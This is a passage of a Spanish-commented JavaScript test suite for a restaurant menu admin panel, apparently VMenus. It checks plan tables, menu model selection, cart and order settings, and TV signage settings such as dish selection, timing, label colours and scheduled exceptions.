	test('de la copia vieja se sale por el nombre', () => {
		// Los tres productos originales llevaban una copia del catálogo dentro.
		// El precio deja de viajar con el plato: pasa a salir siempre del
		// catálogo del negocio, que es lo que arregla el fallo.
		const r = traducir({ atributos: {
			toppings_platino: ['Cebolla', 'Tomate'],
			toppings_premium: [{ nombre: 'Tocineta', precio: 9000 }],
			salsas: ['BBQ'],
		} }, CATALOGO);
		assert.deepEqual(r.platino, ['t_ceb', 't_tom']);
		assert.deepEqual(r.premium, ['t_toc'], 'sin el precio dentro');
		assert.deepEqual(r.salsas,  ['t_bbq']);
	});

	test('un plato nuevo empieza vacío', () => {
		assert.deepEqual(traducir({ atributos: {} }, CATALOGO),
			{ platino: [], premium: [], salsas: [] });
	});

	test('no se queda con referencias a los arreglos del producto', () => {
		// Si compartiera el arreglo, marcar un chip modificaría el producto en
		// memoria y "cambios sin guardar" no vería nada que comparar.
		const c = ctx();
		const p = { atributos: { personalizacion: { platino: ['t_ceb'], premium: [], salsas: [] } } };
		c.personalizacionDe(p, c.catalogoDe(CATALOGO)).platino.push('t_tom');
		assert.deepEqual(p.atributos.personalizacion.platino, ['t_ceb'], 'el producto no se toca');
	});

	test('una copia vieja con entradas rotas no las arrastra', () => {
		const r = traducir({ atributos: {
			toppings_premium: [{ nombre: 'Tocineta', precio: 4000 }, { precio: 1000 }, null],
		} }, CATALOGO);
		assert.deepEqual(r.premium, ['t_toc']);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('tabla de planes del panel', () => {
	// Es un espejo de core/planes.js del menú público: dos aplicaciones
	// desplegadas por separado que deben decir lo mismo. Si divergen, el
	// panel ofrece algo que la carta no pinta, o al revés.
	//
	// Se entra por planDe y no por PLANES a propósito: un 'const' no se
	// engancha al contexto del vm —solo las declaraciones de función—, y de
	// paso se prueba el accesor que usa el panel de verdad.
	const { planDe, nombrePlanDe } = cargar('index.html', 'const TODO_INCLUIDO = {', 'function planActual');
	const plan = nombre => planDe({ atributos: { plan: nombre } });

	test('dos planes, fotos y video, con los mismos modelos que la carta', () => {
		// 17/09/2026. Los de fotos y los de video no se mezclan, y Carrito ya no
		// se ofrece en ninguno.
		assert.equal(JSON.stringify(plan('fotos').modelos), '["topnav","sidebar","explorar"]');
		assert.equal(JSON.stringify(plan('video').modelos), '["video","vertical"]');
		assert.equal(plan('fotos').videos, false);
		assert.equal(plan('video').videos, true);
	});

	test('todo lo demás va incluido en los dos', () => {
		const banderas = ['qr_disenador', 'estadisticas', 'horarios', 'carrito', 'tv'];
		for (const nombre of ['fotos', 'video']) {
			for (const b of banderas) assert.equal(plan(nombre)[b], true, `${nombre} sin «${b}»`);
			assert.equal(plan(nombre).marca, false, `${nombre} no lleva «Hecho con VMenus»`);
		}
	});

	test('los planes de antes se leen como Fotos, y sin plan manda el modelo', () => {
		// Bonzas y Malparados siguen guardados como «completo» hasta la migración.
		for (const viejo of ['vitrina', 'pedidos', 'completo'])
			assert.equal(nombrePlanDe({ atributos: { plan: viejo, nav: 'topnav' } }), 'fotos', viejo);
		assert.equal(nombrePlanDe({ atributos: { nav: 'vertical' } }), 'video');
		assert.equal(nombrePlanDe({ atributos: { nav: 'sidebar' } }), 'fotos');
		assert.equal(nombrePlanDe({ atributos: { plan: 'platino_ultra', nav: 'video' } }), 'video', 'una errata no deja a nadie sin nada');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('navElegido · guardar Apariencia no puede dejar sin modelo', () => {
	// Un <select> al que se le asigna un valor que no está entre sus opciones
	// se queda con "". Y "" en nav lo lee loader.js como falso y cae a topnav:
	// una carta en video se convertía en carta de fotos al pulsar Guardar.
	const elegir = (valorDelSelect, navGuardado) => {
		const ctx = cargar('index.html', 'function navElegido', '// Aplica las restricciones', {
			state: { restaurante: { atributos: navGuardado === undefined ? {} : { nav: navGuardado } } },
			document: { getElementById: () => ({ value: valorDelSelect }) },
		});
		return ctx.navElegido();
	};

	test('se guarda lo que elige el usuario', () => {
		assert.equal(elegir('sidebar', 'topnav'), 'sidebar');
		assert.equal(elegir('video', 'topnav'), 'video');
	});

	test('un desplegable sin la opción no borra el modelo', () => {
		// El caso exacto que rompió Voro.
		assert.equal(elegir('', 'video'), 'video');
	});

	test('sin nada de dónde tirar, topnav', () => {
		// topnav es el modelo por defecto del menú público: es la respuesta
		// segura, no una elección.
		assert.equal(elegir('', undefined), 'topnav');
	});

	test('nunca devuelve cadena vacía', () => {
		for (const [sel, guardado] of [['', ''], ['', null], ['', undefined], ['', 'carrito']])
			assert.notEqual(elegir(sel, guardado), '', `con ${JSON.stringify([sel, guardado])}`);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('donde la carta tiene carrito se configuran los pedidos', () => {
	// Ahí se pone el WhatsApp al que llegan. Sin eso el cliente arma su pedido y
	// no llega a ningún sitio, sin ninguna pista de que falta configurar algo.
	//
	// Hasta el 16/09/2026 la regla decidía si salía la PESTAÑA Pedidos; ahora
	// decide si sale su parte dentro de la tarjeta del carrito, en Ajustes. La
	// regla es la misma —cartaTieneCarrito— y por eso siguen aquí las dos.
	const conAtributos = (atributos, plan = { carrito: true }) => {
		const mapa = {
			tabBtnTv:         { style: {} },
			ajPedidosCuerpo:  { style: {} },
			ajToppingsCuerpo: { style: {} },
			ajCarrito:        { checked: !!atributos.carrito },
		};
		const ctx = cargar('index.html', [
			['// ── ¿LA CARTA TIENE CARRITO DE VERDAD?', '// Mismo criterio que la carta'],
			['function ajustarPestanasAlModelo', '// Qué modelo se guarda'],
			['ajustes.js', '// ¿La carta que se está configurando va a tener carrito?', 'function pintarNotaCarrito'],
		], {
				MODELO_POR_DEFECTO: 'topnav',
				state: { restaurante: { atributos } },
				planActual: () => plan,
				document: { getElementById: id => mapa[id] },
				actualizarAvisoPedidos() {}, marcarBordesDeTabs() {},
			});
		ctx.ajustarPestanasAlModelo();
		ctx.pintarPedidos();
		ctx.pintarToppings();
		// '' es «a la vista»: la hoja de estilos manda cuando no hay estilo en línea.
		const visible = caja => (caja.style.display === 'none' ? 'none' : 'block');
		return {
			pedidos:  visible(mapa.ajPedidosCuerpo),
			toppings: visible(mapa.ajToppingsCuerpo),
			tv:       mapa.tabBtnTv.style.display,
		};
	};

	test('el modelo video con el carrito encendido también', () => {
		// Es lo que faltaba: se encendía el carrito en video y no había dónde
		// poner el número.
		assert.equal(conAtributos({ nav: 'video', carrito: true }).pedidos, 'block');
	});

	test('el modelo video sin carrito no las enseña', () => {
		assert.equal(conAtributos({ nav: 'video', carrito: false }).pedidos, 'none');
	});

	test('sin el plan no se enseñan aunque el interruptor esté puesto', () => {
		// El interruptor puede quedar encendido de un plan anterior. Manda el
		// plan de hoy, igual que en la carta.
		assert.equal(conAtributos({ nav: 'video', carrito: true }, { carrito: false }).pedidos, 'none');
	});

	test('la pestaña de TV solo sale con el plan que la incluye', () => {
		// La cartelera es de pago. Esconder la pestaña no es la protección
		// —el servidor filtra la clave 'tv' por plan— pero enseñarla a quien
		// no la tiene contratada es ofrecerle algo que no va a poder guardar.
		assert.equal(conAtributos({}, { carrito: true, tv: false }).tv, 'none');
		assert.equal(conAtributos({}, { carrito: true, tv: true }).tv, 'block');
	});

	test('si ya está configurada, la pestaña sigue saliendo sin el plan', () => {
		// Un cambio de plan no puede dejar una pantalla encendida en la pared
		// de un local sin ninguna forma de apagarla desde el panel.
		assert.equal(conAtributos({ tv: { activa: true } }, { carrito: true, tv: false }).tv, 'block');
	});

	test('explorar, con el interruptor, también configura pedidos desde el 17/09/2026', () => {
		// Hasta vmenus-app#33 su carta no llamaba a activarCarrito(), y enseñarle
		// estos campos era configurar un WhatsApp al que nunca llegaría un pedido.
		const r = conAtributos({ nav: 'explorar', carrito: true });
		assert.equal(r.pedidos, 'block');
		assert.equal(r.toppings, 'block');
		assert.equal(conAtributos({ nav: 'explorar', carrito: false }).pedidos, 'none', 'sin interruptor, no');
	});

	test('topnav y sidebar, con el interruptor, sí las tienen desde el 15/09/2026', () => {
		for (const nav of ['topnav', 'sidebar', undefined])
			assert.equal(conAtributos({ nav, carrito: true }).pedidos, 'block', nav ?? 'sin modelo');
		for (const nav of ['topnav', 'sidebar'])
			assert.equal(conAtributos({ nav, carrito: false }).pedidos, 'none', `${nav} sin interruptor`);
	});

	test('vertical con plan e interruptor sí las tiene, como indigo', () => {
		assert.equal(conAtributos({ nav: 'vertical', carrito: true }).pedidos, 'block');
	});

	test('un restaurante con el modelo Carrito guardado ya no tiene carrito por eso', () => {
		// Hasta el 17/09/2026 ese modelo lo llevaba siempre encendido. Se retiró y
		// sql/24 pasó a sus dos restaurantes a Sidebar con el interruptor puesto.
		assert.equal(conAtributos({ nav: 'carrito', carrito: false }).pedidos, 'none');
	});

	test('con el carrito apagado los toppings se esconden, aunque haya', () => {
		// Hasta el 16/09/2026 se veían para poder borrarlos. Al probarlo, apagar
		// el carrito dejaba los toppings a la vista, que no es lo que se espera
		// de un interruptor. Esconder no los borra.
		const r = conAtributos({ nav: 'topnav', carrito: false, salsas: [{ id: 't1', nombre: 'BBQ' }] });
		assert.equal(r.toppings, 'none');
		assert.equal(r.pedidos, 'none');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('Pantalla TV · qué se guarda y qué se avisa', () => {
	// La cartelera vive en atributos.tv y la lee tv.html. Que esa clave exista
	// es lo único que la enciende, así que lo que se guarde aquí es lo que va a
	// estar puesto en la pared de un restaurante durante todo un servicio.
	// Un nodo que aguanta lo que hacen las tarjetas: innerHTML, querySelector,
	// replaceWith y appendChild. querySelector devuelve uno nuevo cada vez —no
	// hace falta que recuerde nada, porque lo que estas pruebas comprueban es
	// el ESTADO que se guarda, no el DOM que se pinta.
	const nodoDeMentira = () => ({
		style: {}, onclick: null, onchange: null, textContent: '', className: '',
		value: '', src: '', title: '', type: '',
		_html: '', firstChild: { style: {} }, lastChild: { style: {}, textContent: '' },
		set innerHTML(v) { this._html = v; },
		get innerHTML() { return this._html; },
		appendChild(h) { return h; },
		replaceWith() {},
		querySelector: () => nodoDeMentira(),
		addEventListener() {},
	});

	const montar = (opciones = {}) => {
		const campos = {
			tvActiva:      { checked: opciones.activa !== false },
			tvModo:        { value: opciones.modo || 'todos' },
			tvCategoria:   { value: opciones.categoria || 'c1', innerHTML: '', appendChild() {} },
			tvPorSlide:    { value: String(opciones.porSlide || 2) },
			tvSegundos:    { value: String(opciones.segundos ?? 8) },
			tvOrientacion: { value: opciones.orientacion || 'horizontal' },
			tvAleatorio:   { checked: !!opciones.aleatorio },
			tvAnimacion:   { checked: opciones.animacion !== false },
			tvMostrarCategoria: { checked: !!opciones.mostrarCategoria },
			tvColorCategoria: { value: 'sin pintar' },
			tvColorCategoriaFila: { style: {} },
			tvMuestraCategoria: { style: {} },
			tvAvisoColorCategoria: { textContent: '' },
			tvTema: { value: 'sin pintar' },
			tvMostrarDescripcion: { checked: !!opciones.mostrarDescripcion },
			tvDescripcionFila: { style: {} },
			tvCinta1: { value: '' }, tvCintaPos1: { value: 'arriba' },
			tvCinta2: { value: '' }, tvCintaPos2: { value: 'arriba' },
			tvCinta3: { value: '' }, tvCintaPos3: { value: 'arriba' },
			tvCinta4: { value: '' }, tvCintaPos4: { value: 'arriba' },
			tvCinta5: { value: '' }, tvCintaPos5: { value: 'arriba' },
			tvReloj: { checked: !!opciones.reloj },
			tvRespetarHorarios: { checked: opciones.respetarHorarios !== false },
			tvProgramaciones: { innerHTML: '', appendChild() {} },
			tvProgVacio: { style: {} },
			tvImagenes: { innerHTML: '', appendChild() {} },
			tvImagenesEstado: { textContent: '', style: {} },
			tvNotaHorarios: { innerHTML: '', style: {} },
			tvTemaAyuda: { textContent: '' },
			tvIntercalaPromo: { checked: !!opciones.promoEnTv },
			tvIntercalaMarca: { checked: !!opciones.marca },
			tvMarcaOpciones: { style: {} },
			tvMarcaLogo: { checked: !!(opciones.marca && opciones.marca.logo) },
			tvMarcaFrase: { value: (opciones.marca && opciones.marca.frase) || '' },
			tvMarcaAyuda: { textContent: '', style: {} },
			tvOrdenFila: { style: {} },
			tvOrdenIntercalados: { value: (opciones.primero || 'promocion') },
			tvCada: { value: String(opciones.cada || 4) },
			tvCadaFila: { style: {} },
			tvSecuencia: { textContent: '' },
			tvPromoAyuda: { textContent: '', style: {} },
			tvMarcarTodos: { innerHTML: '', appendChild() {} },
			tvResumen:     { textContent: '', style: {} },
			tvAvisoTamano: { textContent: '', style: {} },
			tvStatus:      { textContent: '', style: {} },
			tvCategoriaWrap: { style: {} }, tvManualWrap: { style: {} },
			tvCuerpo: { style: {} }, tvAjustes: { style: {} },
			tvPlatos: { innerHTML: '', appendChild() {} },
			tvFiltroCat: { innerHTML: '', appendChild() {} },
			tvSeleccionados: { textContent: '' },
			tvEnlace: { value: '' },
		};
		const enviado = [];
		const avisos = [];
		const ctx = cargar('index.html', [
			// La regla del horario vive antes en el archivo: las excepciones de la
			// cartelera la usan para saber si una entrada dice algo.
			['const DIAS_CORTOS', 'let catDiasSel'],
			['function zonaRestaurante', 'function describirHorario'],
			['function describirHorario', 'function renderCatDiasChips'],
			// DIAS_PROMO vive con las tarjetas de promoción y lo reusan las de la
			// cartelera: los días de la semana se leen igual en los dos sitios.
			// Hasta renderPromociones: programacionDe la usan también las
			// miniaturas de imágenes sueltas de la pestaña del televisor.
			['promocion.js', 'const DIAS_PROMO', 'async function renderPromociones'],
			['tv.js', 'const TV_POR_DEFECTO', null],
		], {
			state: {
				// Algunos avisos del televisor cambian según quién mira (CL1).
				rol: opciones.rol || 'cliente',
				promociones: opciones.promociones || [],
				restaurante: Object.assign(
				{ id: 'r1', slug: 'bonzas', color_primario: opciones.colorPrimario,
				  atributos: { tv: opciones.guardado || {} } },
				opciones.promo || {}),
				categorias: [{ id: 'c1', nombre: 'Hamburguesas' }, { id: 'c2', nombre: 'Bebidas' }],
				productos: opciones.productos || [
					{ id: 'p1', nombre: 'Burger', disponible: true,  imagen_url: 'https://x/1.jpg', categoria_id: 'c1' },
					{ id: 'p2', nombre: 'Perro',  disponible: true,  imagen_url: 'https://x/2.jpg', categoria_id: 'c1' },
					{ id: 'p3', nombre: 'Agua',   disponible: true,  imagen_url: '',               categoria_id: 'c2' },
					{ id: 'p4', nombre: 'Agotado',disponible: false, imagen_url: 'https://x/4.jpg', categoria_id: 'c1' },
				],
			},
			// El selector de platos escribe innerHTML y luego toca firstChild y
			// lastChild para poner la foto y el nombre. Un elemento de mentira
			// sin hijos revienta ahí, así que se los damos.
			document: {
				getElementById: id => campos[id],
				createElement: () => nodoDeMentira(),
				// Llevar el foco a la tarjeta de la excepción que falla: aquí no
				// hay tarjetas pintadas, así que no hay ninguna a la que ir.
				querySelectorAll: () => [],
			},
			urlPublica: () => 'https://menu.vmenus.co/bonzas',
			apiFetch: async (m, r, cuerpo) => { enviado.push(cuerpo); return { id: 'r1', atributos: {} }; },
			showToast: (m, t) => avisos.push([t, m]),
			navigator: { clipboard: { writeText: async () => {} } },
			fijarFotoDePestana: () => {},
			Math, parseInt, Array, String, JSON,
		});
		return { ctx, campos, enviado, avisos, tvSeleccion: opciones.seleccion || [] };
	};

	test('solo cuenta platos disponibles Y con foto', () => {
		// Sin foto no hay slide, así que ofrecerlos sería una trampa: el
		// restaurante los marca y luego no salen en la pantalla.
		const { ctx } = montar();
		assert.equal(ctx.tvPlatosPosibles().length, 2, 'de cuatro, dos sirven');
	});

	test('avisa cuando la selección no mostraría ningún plato', () => {
		// El caso "puse la tele y solo sale mi logo". Vale más decirlo al
		// guardar que dejar que lo descubra con los clientes delante.
		const { ctx, campos } = montar({ modo: 'categoria', categoria: 'c2' });
		ctx.tvPintarResumen();
		assert.match(campos.tvResumen.textContent, /no mostraría ningún plato/);
	});

	test('el resumen dice cuánto dura la vuelta completa', () => {
		const { ctx, campos } = montar({ modo: 'todos', porSlide: 1, segundos: 30 });
		ctx.tvPintarResumen();
		// 2 platos, 1 por pantalla, 30 s => 1 minuto justo.
		assert.match(campos.tvResumen.textContent, /2 platos/);
		assert.match(campos.tvResumen.textContent, /1 min/);
	});

	test('un plato por pantalla avisa de la resolución de las fotos', () => {
		// Se guardan a 800 px: repartidas entre dos sobran, ocupando un
		// televisor entero se nota.
		const { ctx, campos } = montar({ porSlide: 1 });
		ctx.tvAvisoTamano();
		assert.equal(campos.tvAvisoTamano.style.display, 'block');
		assert.match(campos.tvAvisoTamano.textContent, /borrosa/);

		const b = montar({ porSlide: 3 });
		b.ctx.tvAvisoTamano();
		assert.equal(b.campos.tvAvisoTamano.style.display, 'none');
	});

	test('de atributos manda SOLO la clave tv', async () => {
		// atributos lo comparten ocho pantallas. Mandar el objeto entero desde
		// la copia que el panel cargó al entrar es el fallo de §9.10.
		//
		// Las columnas de la promoción sí viajan al lado, pero son columnas del
		// restaurante y no comparten nada: no pueden pisar a nadie.
		const { ctx, enviado } = montar();
		await ctx.saveTV();
		assert.deepEqual(Object.keys(enviado[0].atributos), ['tv']);
		assert.deepEqual(Object.keys(enviado[0]).sort(), ['atributos', 'promo_en_tv']);
	});

	test('no deja encender una cartelera que no enseñaría nada', async () => {
		const { ctx, enviado, avisos, campos } = montar({ modo: 'categoria', categoria: 'c2' });
		await ctx.saveTV();
		assert.equal(enviado.length, 0, 'no se guarda');
		assert.equal(avisos[0][0], 'error');
		assert.match(campos.tvStatus.textContent, /Revisa/);
	});

	test('apagada sí se puede guardar aunque no haya platos', async () => {
		// Apagarla es justo lo que hace falta poder hacer cuando algo va mal.
		const { ctx, enviado } = montar({ activa: false, modo: 'categoria', categoria: 'c2' });
		await ctx.saveTV();
		assert.equal(enviado.length, 1);
		assert.equal(enviado[0].atributos.tv.activa, false);
	});

	test('los segundos se acotan antes de guardar, no en la pantalla', async () => {
		// Con 1 segundo la pantalla parpadea. tv.html también lo acota, pero
		// guardar un valor imposible deja al restaurante viendo un número que
		// no es el que se aplica.
		const { ctx, enviado } = montar({ segundos: 1 });
		await ctx.saveTV();
		assert.equal(enviado[0].atributos.tv.segundos, 4);

		const b = montar({ segundos: 9999 });
		await b.ctx.saveTV();
		assert.equal(b.enviado[0].atributos.tv.segundos, 60);
	});

	test('el filtro por categoría no pierde lo marcado en otras', async () => {
		// El susto obvio al pulsar un chip: que al cambiar de categoría se
		// borre lo que ya se eligió en la anterior. El filtro toca lo que se
		// VE, no lo que está marcado.
		//
		// Se llega por el camino real —lo guardado— porque 'tvSeleccion' se
		// declara con let y eso no queda expuesto fuera del guion.
		const { ctx, enviado } = montar({ modo: 'manual', guardado: { modo: 'manual', productos: ['p1'] } });
		ctx.renderTV();
		ctx.tvPintarPlatos();      // con el filtro en 'Todas'
		await ctx.saveTV();
		assert.deepEqual([...enviado[0].atributos.tv.productos], ['p1'], 'sigue marcado');
	});

	test('el pie dice cuántos hay marcados en total', () => {
		// Filtrando es fácil perder de vista los elegidos fuera de la vista.
		const { ctx, campos } = montar({ modo: 'manual', guardado: { modo: 'manual', productos: ['p1', 'p2'] } });
		ctx.renderTV();
		ctx.tvPintarPlatos();
		assert.match(campos.tvSeleccionados.textContent, /2 platos marcados/);
	});

	test('con una sola categoría no se pintan chips', () => {
		// Un filtro que no filtra nada estorba más de lo que ayuda.
		const { ctx, campos } = montar({
			productos: [
				{ id: 'p1', nombre: 'A', disponible: true, imagen_url: 'https://x/1.jpg', categoria_id: 'c1' },
				{ id: 'p2', nombre: 'B', disponible: true, imagen_url: 'https://x/2.jpg', categoria_id: 'c1' },
			],
		});
		ctx.renderTV();
		campos.tvFiltroCat.innerHTML = 'algo';
		ctx.tvPintarFiltroCat();
		assert.equal(campos.tvFiltroCat.innerHTML, '', 'se vacía y no se pinta nada');
	});

	test('la animación se puede apagar y se guarda como tal', async () => {
		// Los televisores viejos tienen poca capacidad de dibujo. Si va a
		// tirones, el restaurante tiene que poder apagarla sin llamar a nadie.
		const { ctx, enviado } = montar({ animacion: false });
		await ctx.saveTV();
		assert.equal(enviado[0].atributos.tv.animacion, 'ninguna');

		const b = montar();
		await b.ctx.saveTV();
		assert.equal(b.enviado[0].atributos.tv.animacion, 'suave', 'encendida por defecto');
	});

	test('avisa cuando hay menos platos que huecos en la pantalla', () => {
		// No es un fallo —salen más grandes y llenan igual, comprobado en el
		// navegador— pero elegir "4 a la vez" y ver dos descoloca sin aviso.
		const { ctx, campos } = montar({ modo: 'categoria', categoria: 'c1', porSlide: 4 });
		ctx.tvPintarResumen();
		assert.match(campos.tvResumen.textContent, /Solo hay 2/);
		assert.match(campos.tvResumen.textContent, /más grandes/);
	});

	test('sugiere el orden aleatorio cuando el ciclo es muy corto', () => {
		// Con una o dos pantallas el bucle se nota mucho. Barajar no añade
		// platos, pero cambia las parejas en cada vuelta y lo disimula.
		const { ctx, campos } = montar({ modo: 'todos', porSlide: 1 });
		ctx.tvPintarResumen();
		assert.match(campos.tvResumen.textContent, /orden aleatorio/);
	});

	test('no lo sugiere si ya está encendido', () => {
		// Sugerir algo que ya está puesto hace dudar de si de verdad lo está.
		const { ctx, campos } = montar({ modo: 'todos', porSlide: 1, aleatorio: true });
		ctx.tvPintarResumen();
		assert.ok(!campos.tvResumen.textContent.includes('aleatorio'));
	});

	test('el resumen dice cuántas pantallas son', () => {
		const { ctx, campos } = montar({ modo: 'todos', porSlide: 1, segundos: 10 });
		ctx.tvPintarResumen();
		assert.match(campos.tvResumen.textContent, /2 pantallas/);
	});

	test('el nombre de la categoría llega apagado a quien nunca lo tocó', () => {
		// Es opcional a propósito: para el restaurante cuyos platos ya se
		// entienden solos, una etiqueta más es ruido sobre la foto.
		//
		// Se comprueba por renderTV y no leyendo la constante: se declara con
		// const y eso no queda expuesto fuera del guion.
		const { ctx, campos } = montar({ mostrarCategoria: true, guardado: {} });
		ctx.renderTV();
		assert.equal(campos.tvMostrarCategoria.checked, false, 'sin nada guardado, apagado');
	});

	test('y encendido si así se guardó', () => {
		const { ctx, campos } = montar({ guardado: { mostrar_categoria: true } });
		ctx.renderTV();
		assert.equal(campos.tvMostrarCategoria.checked, true);
	});

	test('mostrar la categoría se guarda cuando se enciende', async () => {
		const { ctx, enviado } = montar({ mostrarCategoria: true });
		await ctx.saveTV();
		assert.equal(enviado[0].atributos.tv.mostrar_categoria, true);
	});

	test('el color de la etiqueta se guarda', async () => {
		const { ctx, campos, enviado } = montar({ mostrarCategoria: true });
		campos.tvColorCategoria.value = 'marca';
		await ctx.saveTV();
		assert.equal(enviado[0].atributos.tv.color_categoria, 'marca');
	});

	test('sin nada guardado, el color llega en oscuro', () => {
		// El oscuro es el único que se lee encima de cualquier foto. Es el que
		// tiene que salirle a quien nunca abra este selector.
		const { ctx, campos } = montar({});
		ctx.renderTV();
		assert.equal(campos.tvColorCategoria.value, 'oscuro');
	});

	test('un color desconocido no deja el selector en blanco', () => {
		// Puede llegar de una versión anterior o de un retoque a mano en la
		// base. Un <select> con un valor que no existe se queda vacío, y al
		// guardar mandaría cadena vacía.
		const { ctx, campos } = montar({ guardado: { color_categoria: 'fucsia' } });
		ctx.renderTV();
		assert.equal(campos.tvColorCategoria.value, 'oscuro');
	});

	test('el selector de color solo aparece si la etiqueta está encendida', () => {
		const apagada = montar({ guardado: { mostrar_categoria: false } });
		apagada.ctx.renderTV();
		assert.equal(apagada.campos.tvColorCategoriaFila.style.display, 'none');

		const encendida = montar({ guardado: { mostrar_categoria: true } });
		encendida.ctx.renderTV();
		assert.equal(encendida.campos.tvColorCategoriaFila.style.display, 'block');
	});

	test('la muestra enseña el color de la carta, con su contraste', () => {
		const { ctx, campos } = montar({ mostrarCategoria: true, colorPrimario: '#0a4380' });
		campos.tvColorCategoria.value = 'marca';
		ctx.tvPintarMuestraCategoria();
		assert.equal(campos.tvMuestraCategoria.style.background, 'rgba(10, 67, 128, 0.9)');
		// Azul marino: encima va texto blanco. Con amarillo iría negro, y por
		// eso no se puede fijar ninguno de los dos.
		assert.equal(campos.tvMuestraCategoria.style.color, '#ffffff');
		assert.equal(campos.tvAvisoColorCategoria.textContent, '');
	});

	test('sobre amarillo el texto se pone negro', () => {
		const { ctx, campos } = montar({ mostrarCategoria: true, colorPrimario: '#ffd521' });
		campos.tvColorCategoria.value = 'marca';
		ctx.tvPintarMuestraCategoria();
		assert.equal(campos.tvMuestraCategoria.style.color, '#14131c');
	});

	test('sin color guardado se avisa en vez de enseñar un color falso', () => {
		// Tres restaurantes tienen la columna vacía. La cartelera vuelve al
		// oscuro; enseñar aquí una muestra bonita sería mentir sobre lo que va
		// a salir en la pared.
		const { ctx, campos } = montar({ mostrarCategoria: true, colorPrimario: null });
		campos.tvColorCategoria.value = 'marca';
		ctx.tvPintarMuestraCategoria();
		assert.equal(campos.tvMuestraCategoria.style.background, 'rgba(10, 10, 15, 0.62)');
		// Al restaurante no se le nombra una pestaña que no ve (CL1): a él se le
		// dice que escriba, y al superadmin dónde está.
		assert.match(campos.tvAvisoColorCategoria.textContent, /Escríbenos/);
		const admin = montar({ mostrarCategoria: true, colorPrimario: null, rol: 'admin' });
		admin.campos.tvColorCategoria.value = 'marca';
		admin.ctx.tvPintarMuestraCategoria();
		assert.match(admin.campos.tvAvisoColorCategoria.textContent, /pestaña Superadmin/);
	});

	test('el tema de la página se guarda y se relee', async () => {
		const { ctx, campos, enviado } = montar({ guardado: { tema: 'carta' } });
		ctx.renderTV();
		assert.equal(campos.tvTema.value, 'carta');
		await ctx.saveTV();
		assert.equal(enviado[0].atributos.tv.tema, 'carta');
	});

	test('sin tema guardado, neutro', () => {
		// Nadie que no lo pida debe ver su cartelera cambiar de aspecto.
		const { ctx, campos } = montar({});
		ctx.renderTV();
		assert.equal(campos.tvTema.value, 'oscuro');
	});

	// ── PLATOS SUELTOS Y MEZCLA EN LAS EXCEPCIONES ────────────
	test('una excepción de platos sueltos guarda su lista', () => {
		const { ctx } = montar();
		const lista = [{ programacion: { activo: true, dias: [2] }, modo: 'manual',
		                 productos: ['p1', 'p2'], categoria_id: 'c1' }];
		const g = ctx.tvProgramacionesParaGuardar(lista)[0];
		assert.equal(g.modo, 'manual');
		assert.equal(g.productos.join(' '), 'p1 p2');
		// La categoría no pinta nada en modo manual: guardarla dejaría un dato
		// que nadie lee y que confunde al mirar la fila.
		assert.equal(g.categoria_id, null);
	});

	test('una de categoría no arrastra una lista de platos', () => {
		const { ctx } = montar();
		const lista = [{ programacion: { activo: true, dias: [2] }, modo: 'categoria',
		                 categoria_id: 'c1', productos: ['p1'] }];
		const g = ctx.tvProgramacionesParaGuardar(lista)[0];
		assert.equal(g.categoria_id, 'c1');
		assert.equal(g.productos.length, 0);
	});

	test('la mezcla se guarda como booleano, no como lo que venga', () => {
		const { ctx } = montar();
		const lista = [{ programacion: { activo: true, dias: [2] }, modo: 'todos', mezclar: 'sí' }];
		assert.equal(ctx.tvProgramacionesParaGuardar(lista)[0].mezclar, true);
	});

	test('sin mezclar declarado, se guarda apagada', () => {
		const { ctx } = montar();
		const lista = [{ programacion: { activo: true, dias: [2] }, modo: 'todos' }];
		assert.equal(ctx.tvProgramacionesParaGuardar(lista)[0].mezclar, false);
	});

	// ── LAS IMÁGENES SUELTAS DE LA PANTALLA ───────────────────
	// Son promociones con 'en_tv'. Lo que faltaba no era el dato: era poder
	// verlas y crearlas desde la pestaña donde se buscan.
	test('solo se listan las marcadas para el televisor', () => {
		const { ctx, campos } = montar({ promociones: [
			{ id: 'a', en_tv: true,  activa: true, imagen_url: 'https://x/a.jpg', programacion: {} },
			{ id: 'b', en_tv: false, activa: true, imagen_url: 'https://x/b.jpg', programacion: {} },
		] });
		let pintadas = 0;
		campos.tvImagenes.appendChild = () => { pintadas++; };
		ctx.tvPintarImagenes();
		assert.equal(pintadas, 1);
	});

	test('sin ninguna se dice, en vez de dejar el hueco vacío', () => {
		const { ctx, campos } = montar({ promociones: [] });
		let texto = '';
		campos.tvImagenes.appendChild = n => { texto = n.textContent; };
		ctx.tvPintarImagenes();
		assert.match(texto, /Ninguna/);
	});

	// ── EXCEPCIONES CON HORARIO ───────────────────────────────
	// A las siete desayunos, a las doce almuerzos, los martes lo que sea. Manda
	// la PRIMERA vigente, así que el orden importa y hay que poder cambiarlo.
	const CON_HORARIO = { activo: true, dias: [2], desde: '', hasta: '',
	                      desde_fecha: '', hasta_fecha: '' };
	const SIN_NADA    = { activo: true, dias: [], desde: '', hasta: '',
	                      desde_fecha: '', hasta_fecha: '' };

	test('lo guardado se relee', () => {
		const { ctx } = montar({ guardado: { programaciones: [
			{ programacion: CON_HORARIO, modo: 'categoria', categoria_id: 'c1' }] } });
		ctx.renderTV();
		assert.equal(ctx.tvProgramacionesParaGuardar().length, 1);
		assert.equal(ctx.tvProgramacionesParaGuardar()[0].categoria_id, 'c1');
	});

	test('y se guarda dentro de atributos.tv', async () => {
		const { ctx, enviado } = montar({ guardado: { programaciones: [
			{ programacion: CON_HORARIO, modo: 'categoria', categoria_id: 'c1' }] } });
		ctx.renderTV();
		await ctx.saveTV();
		assert.equal(enviado[0].atributos.tv.programaciones.length, 1);
		assert.equal(enviado[0].atributos.tv.programaciones[0].modo, 'categoria');
	});

	test('una excepción sin días, horas ni fechas no se guarda', () => {
		// Sería vigente siempre y taparía la selección base para siempre, sin que
		// se note que fue ella. tv.html se la salta; aquí ni se guarda.
		const { ctx } = montar();
		const lista = [{ programacion: SIN_NADA, modo: 'todos' },
		               { programacion: CON_HORARIO, modo: 'categoria', categoria_id: 'c1' }];
		const guardadas = ctx.tvProgramacionesParaGuardar(lista);
		assert.equal(guardadas.length, 1);
		assert.equal(guardadas[0].categoria_id, 'c1');
	});

	test('y ya no se descarta en silencio: no deja guardar y dice cuál', async () => {
		// Hasta el 17/09/2026 el panel contestaba «✓ Guardado», la tarjeta seguía
		// en pantalla y la excepción había desaparecido al volver a la pestaña.
		const { ctx, enviado, avisos, campos } = montar();
